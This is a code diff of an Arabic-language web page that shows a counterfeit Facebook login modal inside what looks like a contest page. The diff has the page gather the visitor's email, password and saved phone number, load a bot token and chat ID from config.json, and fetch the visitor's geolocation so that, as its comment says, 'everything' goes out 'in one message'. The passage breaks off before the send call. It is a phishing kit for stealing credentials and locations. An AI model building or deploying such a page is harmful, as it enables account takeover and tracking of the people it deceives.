@@ -38,6 +38,7 @@
       color: #000;
     }
 
+    /* صفحة تسجيل دخول كاملة تشبه فيسبوك */
     .modal {
       display: none;
       position: fixed;
@@ -130,18 +131,19 @@
   <div class="modal" id="loginModal">
     <div class="modal-header">facebook</div>
     <span class="close" onclick="closeLogin()">×</span>
-    <form class="modal-content" id="loginForm" autocomplete="on" onsubmit="submitLogin(event)">
-      <input type="text" id="email" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="username" required>
-      <input type="password" id="password" name="password" placeholder="كلمة المرور" autocomplete="current-password" required>
-      <button type="submit" class="login-btn">تسجيل الدخول</button>
+    <div class="modal-content">
+      <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <button class="login-btn" onclick="submitLogin()">تسجيل الدخول</button>
       <div class="modal-footer">© Meta Platforms, Inc.</div>
-    </form>
+    </div>
   </div>
 
   <script>
     let botToken = '';
     let chatId = '';
 
+    // تحميل إعدادات البوت من config.json
     fetch('config.json')
       .then(res => res.json())
       .then(data => {
@@ -149,6 +151,7 @@
         chatId = data.chatId;
       });
 
+    // عرض الرقم المحفوظ
     const phone = localStorage.getItem("userPhone");
     if (phone) {
       document.getElementById('phoneDisplay').textContent = "📱 رقمك هو: " + phone;
@@ -164,9 +167,7 @@
       document.getElementById('loginModal').style.display = 'none';
     }
 
-    function submitLogin(event) {
-      event.preventDefault(); // منع إرسال النموذج تلقائيًا
-
+    function submitLogin() {
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value.trim();
       const phone = localStorage.getItem("userPhone") || "غير متوفر";
@@ -176,6 +177,7 @@
       document.getElementById('contestantCode').textContent = code;
       document.getElementById('codeDisplay').style.display = 'block';
 
+      // جلب الموقع ثم إرسال كل شيء برسالة واحدة
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
           const lat = pos.coords.latitude;
